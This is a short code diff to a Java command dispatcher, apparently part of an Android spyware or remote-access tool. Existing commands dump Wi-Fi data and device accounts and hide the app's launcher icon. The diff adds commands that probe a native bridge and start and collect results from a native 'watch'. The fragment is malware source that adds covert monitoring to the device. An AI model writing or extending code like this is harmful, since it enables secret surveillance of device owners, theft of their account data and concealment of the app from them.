@@ -108,6 +108,15 @@ final class Dispatcher {
                     return ok(WifiMon.dump(ctx));
                 case "accounts":
                     return ok(Accounts.dump(ctx));
+                case "native_state":
+                    return ok(NativeBridge.state());
+                case "native_probe":
+                    return ok(NativeBridge.probe(first));
+                case "watch_start":
+                    return okOr(NativeBridge.available() && NativeBridge.nativeWatch(first),
+                            "watch armed", "watch unavailable");
+                case "watch_drain":
+                    return ok(NativeBridge.available() ? NativeBridge.nativeWatchDrain() : "[]");
                 case "hide_icon":
                     Launcher.setEnabled(ctx, !"off".equals(first));
                     return ok(Launcher.enabled(ctx) ? "icon visible" : "icon hidden");
